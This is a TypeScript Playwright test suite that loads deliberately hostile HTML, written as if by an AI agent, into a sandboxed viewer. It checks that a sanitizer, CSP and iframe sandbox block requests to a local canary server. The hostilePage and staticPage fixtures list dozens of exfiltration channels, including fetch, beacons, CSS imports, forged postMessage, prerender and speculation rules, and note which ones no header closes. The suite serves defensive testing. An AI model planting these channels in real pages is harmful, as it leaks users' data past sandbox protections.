// Containment canary suite in a REAL browser (DESIGN §5.7, L34; C238). A canary server records every request AND every TCP
// connection that reaches it. Two kinds of page:
//  - a STATIC document (no script): with the sanitizer and our headers it must reach the canary 0 times (requests and
//    connections) and must still render (a marker and its style prove it). A control serves the SAME static document with
//    our CSP but without the sanitizer: it must reach the canary (static markup such as <link rel=prerender> is not stopped
//    by any header; that is why the sanitizer exists).
//  - a SCRIPT page (scripts stay ON, C167): the channels our CSP covers must stay at 0; the channels no header closes
//    (R3: <link rel=prerender> and speculation rules added by script, <a>.click(), preconnect) are RECORDED per channel,
//    not asserted to be 0. The table is printed, and written to $CANARY_REPORT when set.
//
// Needs Chrome + playwright-core (no download): PW_CORE=<path to playwright-core/index.mjs> (default: the website
// checkout's copy) and the system Chrome (or CHROME_PATH). Without them the suite is SKIPPED with a message — it is
// local / QA evidence, not a CI gate (the CI image has no browser). Residuals R1 (DNS hints) and R2 (WebRTC STUN) are
// out of scope here (DESIGN §5.4).
import assert from "node:assert/strict";
import { existsSync, writeFileSync } from "node:fs";
import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http";
import type { AddressInfo } from "node:net";
import { after, before, describe, it } from "node:test";
import { opaqueDigest, VIEWER_REQUEST_HEADERS } from "@opt2-tealbrick/manifest";
import type { Db } from "@opt2-tealbrick/miniapp-sdk";
import { documentCsp, handleViewer, newToken, VIEW_PREFIX, type ViewerConfig } from "../../src/viewer.ts";
import { migratedDb } from "../helpers.ts";

const PW = process.env.PW_CORE ?? "/Users/puma/work/active/website-martin-redesign/node_modules/playwright-core/index.mjs";
const CHROME = process.env.CHROME_PATH ?? "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const available = existsSync(PW) && existsSync(CHROME);
const WAIT_MS = Number(process.env.CANARY_WAIT_MS ?? 2500);

function listen(handler: (req: IncomingMessage, res: ServerResponse) => void): Promise<{ server: Server; origin: string }> {
  return new Promise((resolve) => {
    const server = createServer(handler);
    server.listen(0, "127.0.0.1", () => resolve({ server, origin: `http://127.0.0.1:${(server.address() as AddressInfo).port}` }));
  });
}

/** Every exit we try. `C` is the canary origin. Each attempt is wrapped so one blocked call never stops the next. */
function hostilePage(C: string): string {
  const tries = [
    `fetch("${C}/fetch").catch(()=>{})`,
    `fetch("${C}/fetch-nocors",{mode:"no-cors"}).catch(()=>{})`,
    `var x=new XMLHttpRequest();x.open("GET","${C}/xhr");x.send()`,
    `new WebSocket("${C.replace("http", "ws")}/ws")`,
    `new EventSource("${C}/sse")`,
    `navigator.sendBeacon("${C}/beacon","x")`,
    `var i=new Image();i.src="${C}/img";document.body.appendChild(i)`,
    `var s=document.createElement("style");s.textContent="body{background:url(${C}/cssurl)}";document.head.appendChild(s)`,
    `var s2=document.createElement("style");s2.textContent="@import url(${C}/cssimport);";document.head.appendChild(s2)`,
    `var l=document.createElement("link");l.rel="stylesheet";l.href="${C}/link";document.head.appendChild(l)`,
    `var p=document.createElement("link");p.rel="prefetch";p.href="${C}/prefetch";document.head.appendChild(p)`,
    `var sc=document.createElement("script");sc.src="${C}/script";document.head.appendChild(sc)`,
    `var f=document.createElement("iframe");f.src="${C}/iframe";document.body.appendChild(f)`,
    `var fm=document.createElement("form");fm.action="${C}/form";fm.method="GET";document.body.appendChild(fm);fm.submit()`,
    `window.open("${C}/open")`,
    `top.location="${C}/top"`,
    `new Worker("data:text/javascript,fetch('${C}/worker')")`,
    `document.cookie`,
    `localStorage.setItem("x","1")`,
    `parent.postMessage({type:"tb:resize",height:1e9},"*")`,
    `parent.postMessage({type:"tb:navigate",url:"${C}/forged"},"*")`,
    `setTimeout(()=>{location="${C}/location"},300)`,
    // R3 channels (C238): no header closes these in Chrome
    `var pr=document.createElement("link");pr.rel="prerender";pr.href="${C}/dyn-prerender";document.head.appendChild(pr)`,
    `var sr=document.createElement("script");sr.type="speculationrules";sr.textContent=JSON.stringify({prerender:[{source:"list",urls:["${C}/dyn-speculation"]}]});document.head.appendChild(sr)`,
    `var an=document.createElement("a");an.href="${C}/anchor-click";document.body.appendChild(an);an.click()`,
    `var pc=document.createElement("link");pc.rel="preconnect";pc.href="${C}";document.head.appendChild(pc)`,
    `var dp=document.createElement("link");dp.rel="dns-prefetch";dp.href="${C}";document.head.appendChild(dp)`,
  ];
  const body = ['console.log("hostile-ran")', 'console.log("href:" + location.href + " ref:" + document.referrer)', ...tries].map((t) => `try{${t}}catch(e){}`).join("\n");
  return `<!doctype html><html><head><meta http-equiv="refresh" content="1;url=${C}/meta"></head><body><h1>hostile</h1>
<script>${body}</script><img src="${C}/static-img"><video src="${C}/video"></video></body></html>`;
}

/** Paths our CSP and sandbox stop; they must stay at 0 even for a script page. */
const COVERED = ["/fetch", "/fetch-nocors", "/xhr", "/ws", "/sse", "/beacon", "/img", "/cssurl", "/cssimport", "/link", "/prefetch", "/script", "/iframe", "/form", "/open", "/top", "/worker", "/forged", "/location", "/static-img", "/video", "/meta"];
/** Channels no header closes (R3): recorded, never asserted to be 0. "connection" = a TCP connection with no request. */
const R3 = ["/dyn-prerender", "/dyn-speculation", "/anchor-click"];

/** A page with NO script that tries every static way out. The marker proves it rendered. */
function staticPage(C: string): string {
  return `<!doctype html><html><head><meta charset="utf-8"><title>static</title>
<link rel="prerender" href="${C}/s-prerender"><link rel="prefetch" href="${C}/s-prefetch"><link rel="preload" as="image" href="${C}/s-preload">
<link rel="stylesheet" href="${C}/s-sheet"><link rel="dns-prefetch" href="${C}"><link rel="preconnect" href="${C}"><link rel="modulepreload" href="${C}/s-mod">
<base href="${C}/s-base/"><meta http-equiv="refresh" content="1;url=${C}/s-meta"><link rel="icon" href="${C}/s-icon">
<style>@import url(${C}/s-import);#m{color:rgb(1,2,3);background:url(${C}/s-cssurl)}.i{background-image:image-set("${C}/s-imageset" 1x)}</style></head>
<body background="${C}/s-bodybg"><h1 id="m" style="border-image:url(${C}/s-inline)">static-marker</h1>
<img src="${C}/s-img"><img srcset="${C}/s-srcset 1x"><video poster="${C}/s-poster" src="${C}/s-video"></video><audio src="${C}/s-audio"></audio>
<iframe src="${C}/s-iframe"></iframe><object data="${C}/s-object"></object><embed src="${C}/s-embed"><portal src="${C}/s-portal"></portal>
<form action="${C}/s-form"><input type="image" src="${C}/s-input"><button formaction="${C}/s-formaction">go</button></form>
<svg width="20" height="20"><image href="${C}/s-svgimage"/><use href="${C}/s-use#a"/></svg><a href="${C}/s-anchor" ping="${C}/s-ping">link</a>
<script type="speculationrules">{"prerender":[{"source":"list","urls":["${C}/s-speculation"]}]}</script>
<p id="ok" style="color:rgb(4,5,6)">still here</p></body></html>`;
}

describe("containment canary (real Chrome)", { skip: available ? false : `skipped: needs playwright-core (${PW}) and Chrome (${CHROME})` }, () => {
  let db: Db;
  let canary: { server: Server; origin: string };
  let views: { server: Server; origin: string };
  let plain: { server: Server; origin: string };
  const hits: string[] = [];
  let conns = 0;
  let staticToken = "";
  let rawStatic: { server: Server; origin: string };
  let rawParent: { server: Server; origin: string };
  let chromeVersion = "";
  let token = "";
  let goodToken = "";
  let previewToken = "";
  let main: { server: Server; origin: string };
  let browser: { newPage(): Promise<any>; close(): Promise<void> } | undefined;

  before(async () => {
    canary = await listen((req, res) => {
      hits.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
      res.end("leak");
    });
    canary.server.on("connection", () => {
      conns++;
    });
    db = migratedDb();
    const now = Date.now();
    db.prepare(
      `INSERT INTO la_artifact (id, gallery_id, title, description, status, live_version, auto_publish, refresh_state, created_by_type, created_by_id, created_by_name, created_at, updated_at)
       VALUES ('art_01J00000000000000000000CAN', 'shared', 'Canary', '', 'active', 1, 'owner', 'off', 'agent', 'agt_x', 'Mallory', ?, ?)`,
    ).run(now, now);
    // written straight into the table: the write-time lint is advice, not the boundary, so the test bypasses it
    db.prepare(
      "INSERT INTO la_version (artifact_id, n, html, html_sha256, contract_json, contract_sha256, bytes, created_by_type, created_by_id, created_by_name, created_at) VALUES ('art_01J00000000000000000000CAN', 1, ?, 'x', '{\"v\":1,\"inputs\":[],\"triggers\":[]}', 'x', 1, 'agent', 'agt_x', 'Mallory', ?)",
    ).run(Buffer.from(hostilePage(canary.origin), "utf8"), now);
    token = newToken();
    db.prepare(
      "INSERT INTO la_link (id, artifact_id, kind, token_digest, label, created_by_type, created_by_id, created_by_name, created_at, expires_at) VALUES ('lnk_01J00000000000000000000CAN', 'art_01J00000000000000000000CAN', 'viewer', ?, '', 'person', 'per_x', 'Owner', ?, ?)",
    ).run(opaqueDigest(token), now, now + 3_600_000);
    // a benign page with one push source shown to link viewers: the shell must render it and deliver the data
    db.prepare(
      `INSERT INTO la_artifact (id, gallery_id, title, description, status, live_version, auto_publish, refresh_state, created_by_type, created_by_id, created_by_name, created_at, updated_at)
       VALUES ('art_01J00000000000000000000G0D', 'shared', 'Weekly numbers', '', 'active', 1, 'owner', 'off', 'agent', 'agt_y', 'Scout', ?, ?)`,
    ).run(now, now);
    db.prepare(
      "INSERT INTO la_version (artifact_id, n, html, html_sha256, contract_json, contract_sha256, bytes, created_by_type, created_by_id, created_by_name, created_at) VALUES ('art_01J00000000000000000000G0D', 1, ?, 'x', '{}', 'x', 1, 'agent', 'agt_y', 'Scout', ?)",
    ).run(Buffer.from('<!doctype html><h1 id="n">waiting</h1><script>tb.onData((d)=>{document.getElementById("n").textContent="total "+d.n.total});tb.ready();</script>', "utf8"), now);
    db.prepare("INSERT INTO la_source (artifact_id, key, kind, digest, approved_digest, viewers) VALUES ('art_01J00000000000000000000G0D', 'n', 'push', 'd', 'd', 1)").run();
    db.prepare("INSERT INTO la_snapshot (artifact_id, key, data_json, bytes, fetched_at, status) VALUES ('art_01J00000000000000000000G0D', 'n', '{\"total\":42}', 12, ?, 'ok')").run(now);
    goodToken = newToken();
    db.prepare(
      "INSERT INTO la_link (id, artifact_id, kind, token_digest, label, created_by_type, created_by_id, created_by_name, created_at, expires_at) VALUES ('lnk_01J00000000000000000000G0D', 'art_01J00000000000000000000G0D', 'viewer', ?, '', 'person', 'per_x', 'Owner', ?, ?)",
    ).run(opaqueDigest(goodToken), now, now + 3_600_000);
    // a static document (no script) that tries every static way out; it must render, and reach nothing
    db.prepare(
      `INSERT INTO la_artifact (id, gallery_id, title, description, status, live_version, auto_publish, refresh_state, created_by_type, created_by_id, created_by_name, created_at, updated_at)
       VALUES ('art_01J00000000000000000000STA', 'shared', 'Static', '', 'active', 1, 'owner', 'off', 'agent', 'agt_z', 'Mallory', ?, ?)`,
    ).run(now, now);
    db.prepare(
      "INSERT INTO la_version (artifact_id, n, html, html_sha256, contract_json, contract_sha256, bytes, created_by_type, created_by_id, created_by_name, created_at) VALUES ('art_01J00000000000000000000STA', 1, ?, 'x', '{}', 'x', 1, 'agent', 'agt_z', 'Mallory', ?)",
    ).run(Buffer.from(staticPage(canary.origin), "utf8"), now);
    staticToken = newToken();
    db.prepare(
      "INSERT INTO la_link (id, artifact_id, kind, token_digest, label, created_by_type, created_by_id, created_by_name, created_at, expires_at) VALUES ('lnk_01J00000000000000000000STA', 'art_01J00000000000000000000STA', 'viewer', ?, '', 'person', 'per_x', 'Owner', ?, ?)",
    ).run(opaqueDigest(staticToken), now, now + 3_600_000);
    // the owner's preview of the benign page (framed by the owner UI on the "main" origin)
    previewToken = newToken();
    db.prepare(
      "INSERT INTO la_link (id, artifact_id, kind, token_digest, label, created_by_type, created_by_id, created_by_name, created_at, expires_at, pin_version) VALUES ('lnk_01J00000000000000000000PRV', 'art_01J00000000000000000000G0D', 'preview', ?, 'preview', 'person', 'per_x', 'Owner', ?, ?, 1)",
    ).run(opaqueDigest(previewToken), now, now + 600_000);
    let cfg: ViewerConfig = { viewOrigin: null, mainOrigin: null, workspaceName: "Acme", docKey: "canary-doc-key" };
    views = await listen(async (req, res) => {
      // what the SDK does for the viewer route: the handler sees the path WITHOUT /v/live-artifacts and only allow-listed headers
      const rest = (req.url ?? "/").slice(VIEW_PREFIX.length) || "/";
      const headers: Record<string, string> = {};
      for (const name of VIEWER_REQUEST_HEADERS) if (typeof req.headers[name] === "string") headers[name] = req.headers[name] as string;
      const r = handleViewer(db, new Request(`http://live-artifacts.views.internal${rest}`, { method: req.method ?? "GET", headers }), cfg, Date.now());
      res.writeHead(r.status, Object.fromEntries(r.headers));
      res.end(Buffer.from(await r.arrayBuffer()));
    });
    main = await listen((_req, res) => {
      res.writeHead(200, { "content-type": "text/html" });
      res.end(`<!doctype html><h1>Owner UI</h1><iframe id="pv" sandbox="allow-scripts allow-same-origin" src="${views.origin}/v/live-artifacts/${previewToken}" style="width:800px;height:600px"></iframe>`);
    });
    cfg = { ...cfg, viewOrigin: views.origin, mainOrigin: main.origin };
    // control for the static page: the SAME document with our document CSP but WITHOUT the sanitizer, in the same kind of frame
    rawParent = await listen((_req, res) => {
      res.writeHead(200, { "content-type": "text/html" });
      res.end(`<!doctype html><iframe sandbox="allow-scripts" src="${rawStatic.origin}/" style="width:600px;height:400px"></iframe>`);
    });
    rawStatic = await listen((_req, res) => {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8", "content-security-policy": documentCsp({ ...cfg, viewOrigin: rawParent.origin }) });
      res.end(staticPage(canary.origin));
    });
    plain = await listen((_req, res) => {
      res.writeHead(200, { "content-type": "text/html" });
      res.end(hostilePage(canary.origin));
    });
    const { chromium } = await import(PW);
    browser = await chromium.launch({ executablePath: CHROME });
    chromeVersion = String((browser as unknown as { version(): string }).version());
  });
  const newPage = async () => {
    if (!browser) throw new Error("no browser");
    return browser.newPage();
  };
  after(async () => {
    await browser?.close();
    for (const s of [canary, views, plain, main, rawStatic, rawParent]) s?.server.close();
  });

  it("a benign page renders in the sandboxed frame and receives its data through tb.onData (quiet on good)", async () => {
    hits.length = 0;
    const page = await newPage();
    await page.goto(`${views.origin}/v/live-artifacts/${goodToken}`);
    const frame = page.frameLocator("iframe");
    await frame.locator("#n", { hasText: "total 42" }).waitFor({ timeout: 10_000 });
    assert.equal(await page.evaluate(() => document.getElementById("title")?.textContent), "Weekly numbers");
    assert.match(String(await page.evaluate(() => document.getElementById("by")?.textContent)), /Shared by Acme · written by an AI agent \(Scout\)/);
    assert.deepEqual(hits, []);
    await page.close();
  });

  it("control: the same page WITHOUT our headers reaches the canary (the harness sees leaks)", async () => {
    hits.length = 0;
    const page = await newPage();
    await page.goto(`${plain.origin}/`).catch(() => {});
    // the unprotected hostile page may navigate or crash its own tab; what reached the canary is what counts
    await page.waitForTimeout(WAIT_MS).catch(() => {});
    await page.close().catch(() => {});
    assert.ok(hits.length >= 5, `control run must leak; canary saw ${hits.length}: ${hits.join(", ")}`);
  });

  it("script page through the viewer shell: every covered channel stays at 0 (R3 channels are recorded), no frame leaves the views origin, forged messages are ignored", async () => {
    hits.length = 0;
    conns = 0;
    const page = await newPage();
    const popups: string[] = [];
    page.on("popup", (p: { url(): string }) => popups.push(p.url()));
    const logs: string[] = [];
    page.on("console", (m: { text(): string }) => logs.push(m.text()));
    await page.goto(`${views.origin}/v/live-artifacts/${token}`);
    await page.waitForTimeout(WAIT_MS);
    const reached = (path: string): boolean => hits.some((h) => h.split("?")[0] === path);
    const leaked = COVERED.filter(reached);
    assert.deepEqual(leaked, [], `covered channels must stay quiet; saw: ${leaked.join(", ")}`);
    const unexpected = hits.map((h) => h.split("?")[0] as string).filter((h) => !COVERED.includes(h) && !R3.includes(h));
    assert.deepEqual(unexpected, [], `a request nobody listed reached the canary: ${unexpected.join(", ")}`);
    assert.equal(page.url(), `${views.origin}/v/live-artifacts/${token}`, "the top page did not navigate");
    assert.deepEqual(popups, [], "no popup opened");
    // the hostile page tried to navigate its own frame away; frame-src blocked it (Chrome leaves an error page in the
    // frame). Assert that no frame ever reached another origin.
    const frameUrls: string[] = page.frames().map((f: { url(): string }) => f.url());
    assert.ok(!frameUrls.some((u) => u.startsWith(canary.origin)), `no frame on the canary origin: ${frameUrls.join(", ")}`);
    assert.ok(logs.includes("hostile-ran"), "the hostile script really ran inside the frame");
    assert.ok(logs.some((l) => l.startsWith("href:")), "the page read its own URL");
    assert.ok(!logs.some((l) => l.includes(token)), "…which never contains the link token (review PR #2, finding 3)");
    const height = Number.parseInt(await page.evaluate(() => (document.querySelector("iframe") as HTMLIFrameElement).style.height || "480"), 10);
    assert.ok(height <= 20000, `a forged resize is clamped (${height}px)`);
    assert.equal(await page.evaluate(() => document.getElementById("title")?.textContent), "Canary", "banner rendered by the shell");
    await page.close();
  });

  let seq = 0;
  /** A page (viewer link) with the given body, written straight into the table. */
  function addPage(html: string, opts: { scriptsOk?: boolean; total?: number } = {}): string {
    const n = ++seq;
    const id = `01J${"0".repeat(19)}R${String(n).padStart(3, "0")}`;
    const now = Date.now();
    db.prepare(
      `INSERT INTO la_artifact (id, gallery_id, title, description, status, live_version, auto_publish, refresh_state, created_by_type, created_by_id, created_by_name, created_at, updated_at)
       VALUES (?, 'shared', 'Probe', '', 'active', 1, 'owner', 'off', 'agent', 'agt_p', 'Mallory', ?, ?)`,
    ).run(`art_${id}`, now, now);
    db.prepare(
      "INSERT INTO la_version (artifact_id, n, html, html_sha256, contract_json, contract_sha256, bytes, created_by_type, created_by_id, created_by_name, created_at) VALUES (?, 1, ?, 'x', '{}', 'x', 1, 'agent', 'agt_p', 'Mallory', ?)",
    ).run(`art_${id}`, Buffer.from(html, "utf8"), now);
    if (opts.total !== undefined) {
      db.prepare("INSERT INTO la_source (artifact_id, key, kind, digest, approved_digest, viewers) VALUES (?, 'n', 'push', 'd', 'd', 1)").run(`art_${id}`);
      db.prepare("INSERT INTO la_snapshot (artifact_id, key, data_json, bytes, fetched_at, status) VALUES (?, 'n', ?, 12, ?, 'ok')").run(`art_${id}`, JSON.stringify({ total: opts.total }), now);
    }
    const tok = newToken();
    db.prepare(
      "INSERT INTO la_link (id, artifact_id, kind, token_digest, label, created_by_type, created_by_id, created_by_name, created_at, expires_at, scripts_ok) VALUES (?, ?, 'viewer', ?, '', 'person', 'per_x', 'Owner', ?, ?, ?)",
    ).run(`lnk_${id}`, `art_${id}`, opaqueDigest(tok), now, now + 3_600_000, opts.scriptsOk === false ? 0 : 1);
    return tok;
  }

  it("R3 channels, one script page each: RECORDED per channel (no header closes them), never asserted to be 0", async () => {
    const C = canary.origin;
    const probes: [string, string][] = [
      ["script adds <link rel=prerender>", `var l=document.createElement("link");l.rel="prerender";l.href="${C}/p-prerender";document.head.appendChild(l)`],
      ["script adds <link rel=prefetch>", `var l=document.createElement("link");l.rel="prefetch";l.href="${C}/p-prefetch";document.head.appendChild(l)`],
      ["script adds speculation rules (prerender)", `var s=document.createElement("script");s.type="speculationrules";s.textContent=JSON.stringify({prerender:[{source:"list",urls:["${C}/p-spec-prerender"]}]});document.head.appendChild(s)`],
      ["script adds speculation rules (prefetch)", `var s=document.createElement("script");s.type="speculationrules";s.textContent=JSON.stringify({prefetch:[{source:"list",urls:["${C}/p-spec-prefetch"]}]});document.head.appendChild(s)`],
      ["script clicks an <a href>", `var a=document.createElement("a");a.href="${C}/p-click";document.body.appendChild(a);a.click()`],
      ["script adds <link rel=preconnect>", `var l=document.createElement("link");l.rel="preconnect";l.href="${C}";document.head.appendChild(l)`],
      ["script adds <link rel=dns-prefetch>", `var l=document.createElement("link");l.rel="dns-prefetch";l.href="${C}";document.head.appendChild(l)`],
      ["fetch (control: our CSP covers it)", `fetch("${C}/p-fetch").catch(()=>{})`],
    ];
    const rows: { channel: string; requests: string[]; connections: number }[] = [];
    for (const [channel, code] of probes) {
      hits.length = 0;
      conns = 0;
      const tok = addPage(`<!doctype html><h1 id="m">probe</h1><script>try{${code}}catch(e){}</script>`);
      const page = await newPage();
      await page.goto(`${views.origin}/v/live-artifacts/${tok}`);
      // the click probe navigates its own frame to a blocked address, so a missing marker is not an error here
      await page.frameLocator("iframe").locator("#m").waitFor({ timeout: 4_000 }).catch(() => {});
      await page.waitForTimeout(WAIT_MS);
      rows.push({ channel, requests: hits.map((h) => h.split("?")[0] as string), connections: conns });
      await page.close();
    }
    const lines = rows.map((r) => `  ${r.requests.length + r.connections > 0 ? "REACHED " : "blocked "} requests=${r.requests.length} connections=${r.connections}  ${r.channel}`);
    console.log(`R3 channels (Chrome ${chromeVersion}), one script page each, through the sanitizer and our headers:\n${lines.join("\n")}`);
    if (process.env.CANARY_REPORT) writeFileSync(process.env.CANARY_REPORT, `${JSON.stringify({ chrome: chromeVersion, rows }, null, 2)}\n`);
    const fetchRow = rows.find((r) => r.channel.startsWith("fetch"));
    assert.deepEqual(fetchRow?.requests, [], "the covered control channel stays quiet");
  });

  it("STATIC page through the viewer shell: 0 requests and 0 connections reach the canary, and it still renders", async () => {
    hits.length = 0;
    conns = 0;
    const page = await newPage();
    await page.goto(`${views.origin}/v/live-artifacts/${staticToken}`);
    const frame = page.frameLocator("iframe");
    await frame.locator("#m", { hasText: "static-marker" }).waitFor({ timeout: 10_000 });
    assert.equal(await frame.locator("#m").evaluate((el: Element) => getComputedStyle(el).color), "rgb(1, 2, 3)", "the page's own style still applies");
    assert.equal(await frame.locator("#ok").evaluate((el: Element) => getComputedStyle(el).color), "rgb(4, 5, 6)", "inline style still applies");
    await page.waitForTimeout(WAIT_MS);
    assert.deepEqual(hits, [], `a static page must reach nothing; saw: ${hits.join(", ")}`);
    assert.equal(conns, 0, "…and open no connection (preconnect, dns-prefetch)");
    await page.close();
  });

  it("PUBLIC LINK of a script-free page (scriptless render): script-src none, sandbox without allow-scripts, data inlined, 0 requests and 0 connections, and it renders", async () => {
    hits.length = 0;
    conns = 0;
    const tok = addPage(staticPage(canary.origin).replace("</body>", '<p id="t" data-tb-text="n.total">?</p></body>'), { total: 42 });
    const page = await newPage();
    await page.goto(`${views.origin}/v/live-artifacts/${tok}`);
    const frame = page.frameLocator("iframe");
    await frame.locator("#m", { hasText: "static-marker" }).waitFor({ timeout: 10_000 });
    assert.equal(await frame.locator("#t").textContent(), "42", "the data was inlined when the page was served");
    assert.equal(await page.evaluate(() => (document.querySelector("iframe") as HTMLIFrameElement).getAttribute("sandbox")), "", "framed without allow-scripts");
    const data = (await (await fetch(`${views.origin}/v/live-artifacts/${tok}/data`)).json()) as { doc: string; scriptless: boolean; runsScripts: boolean };
    assert.equal(data.scriptless, true);
    assert.equal(data.runsScripts, false);
    const doc = await fetch(`${views.origin}/v/live-artifacts/${data.doc}`, { headers: { "sec-fetch-dest": "iframe" } });
    const csp = doc.headers.get("content-security-policy") ?? "";
    assert.match(csp, /^sandbox; /);
    assert.match(csp, /script-src 'none'/);
    assert.ok(!(await doc.text()).includes("<script"), "no script element in what was served");
    await page.waitForTimeout(WAIT_MS);
    assert.deepEqual(hits, [], `saw: ${hits.join(", ")}`);
    assert.equal(conns, 0);
    await page.close();
  });

  it("a link NOT approved for scripts shows a script page without scripts: nothing runs, 0 requests, 0 connections", async () => {
    hits.length = 0;
    conns = 0;
    const tok = addPage(hostilePage(canary.origin).replace("<h1>hostile</h1>", '<h1 id="m">hostile-marker</h1>'), { scriptsOk: false });
    const page = await newPage();
    const logs: string[] = [];
    page.on("console", (m: { text(): string }) => logs.push(m.text()));
    await page.goto(`${views.origin}/v/live-artifacts/${tok}`);
    await page.frameLocator("iframe").locator("#m", { hasText: "hostile-marker" }).waitFor({ timeout: 10_000 });
    await page.waitForTimeout(WAIT_MS);
    assert.ok(!logs.includes("hostile-ran"), "the page's script did not run");
    assert.deepEqual(hits, [], `saw: ${hits.join(", ")}`);
    assert.equal(conns, 0);
    await page.close();
  });

  it("control: the SAME static page with our CSP but without the sanitizer reaches the canary (no header stops static markup)", async () => {
    hits.length = 0;
    conns = 0;
    const page = await newPage();
    await page.goto(`${rawParent.origin}/`);
    await page.waitForTimeout(WAIT_MS);
    const paths = [...new Set(hits.map((h) => h.split("?")[0]))];
    console.log(`canary control (Chrome ${chromeVersion}), static page WITHOUT the sanitizer reached: ${paths.join(", ") || "nothing"}; connections: ${conns}`);
    await page.close();
    assert.ok(paths.includes("/s-prerender"), `the control must reach the canary through the static <link rel=prerender>; it reached: ${paths.join(", ") || "nothing"}. If this fails, Chrome or the harness changed`);
  });

  it("the document opened directly (no shell) is refused: 404 and 0 requests reach the canary", async () => {
    hits.length = 0;
    const data = await (await fetch(`${views.origin}/v/live-artifacts/${token}/data`)).json();
    const page = await newPage();
    const r = await page.goto(`${views.origin}/v/live-artifacts/${data.doc}`);
    assert.equal(r?.status(), 404, "Sec-Fetch-Dest document → 404");
    await page.waitForTimeout(WAIT_MS);
    assert.deepEqual(hits, [], `saw: ${hits.join(", ")}`);
    await page.close();
  });

  it("owner preview: the owner UI frames the preview shell, which frames the document (frame-ancestors covers both)", async () => {
    const page = await newPage();
    await page.goto(`${main.origin}/`);
    const doc = page.frameLocator("#pv").frameLocator("iframe");
    await doc.locator("#n", { hasText: "total 42" }).waitFor({ timeout: 10_000 });
    await page.close();
  });
});
